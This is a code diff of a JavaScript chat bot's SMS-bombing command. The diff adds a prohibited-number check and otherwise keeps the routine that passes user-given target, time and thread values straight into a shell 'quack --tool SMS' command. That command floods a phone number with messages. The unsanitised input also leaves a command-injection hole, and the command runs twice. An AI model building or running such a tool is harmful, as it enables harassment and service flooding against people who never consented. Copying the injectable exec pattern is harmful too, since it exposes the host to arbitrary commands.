@@ -83,29 +83,44 @@ class Responses{
     } 
     getSmsBomb(ctx, exec){
         ctx.reply("Started sms bombing...");
-        const command = `quack --tool SMS --target ${ctx.state.command.splitArgs[0]} --time ${ctx.state.command.splitArgs[1]} --threads ${ctx.state.command.splitArgs[2]}`;
-        require('child_process').exec(command);
 
-        exec(command, (error, stdout, stderr) => {
-            if (error) {
-                console.log(`error: ${error.message}`);
-                return;
+        // Checks if the number is prohibited
+        let num = false;
+        const numList = require('./data/prohibitedNumbers.json');
+        for(let i=0; i<numList.length; i++){
+            if(ctx.state.command.splitArgs[0]==numList[i]){
+                num = true;
             }
-            if (stderr) {
-                console.log(`stderr: ${stderr}`);
-                return;
-            }
+        }
 
-            const result = stdout.split("\n");
-            var sentMessages = 0;
-            for(let i=0; i<result.length; i++){
-                const index = result[i].search("[+]");
-                if(index!=-1){
-                    sentMessages++;
+        if(num==true){
+            ctx.reply('This number is prohibited');
+        }
+        else{
+            const command = `quack --tool SMS --target ${ctx.state.command.splitArgs[0]} --time ${ctx.state.command.splitArgs[1]} --threads ${ctx.state.command.splitArgs[2]}`;
+            require('child_process').exec(command);
+
+            exec(command, (error, stdout, stderr) => {
+                if (error) {
+                    console.log(`error: ${error.message}`);
+                    return;
                 }
-            }
-            ctx.reply(`${sentMessages} messages sent`);
-        });
+                if (stderr) {
+                    console.log(`stderr: ${stderr}`);
+                    return;
+                }
+
+                const result = stdout.split("\n");
+                var sentMessages = 0;
+                for(let i=0; i<result.length; i++){
+                    const index = result[i].search("[+]");
+                    if(index!=-1){
+                        sentMessages++;
+                    }
+                }
+                ctx.reply(`${sentMessages} messages sent`);
+            });
+        }    
     }
     getAudio(ctx, googleTTS){
         googleTTS(ctx.state.command.args, 'it', 1)   // speed normal = 1 (default), slow = 0.24
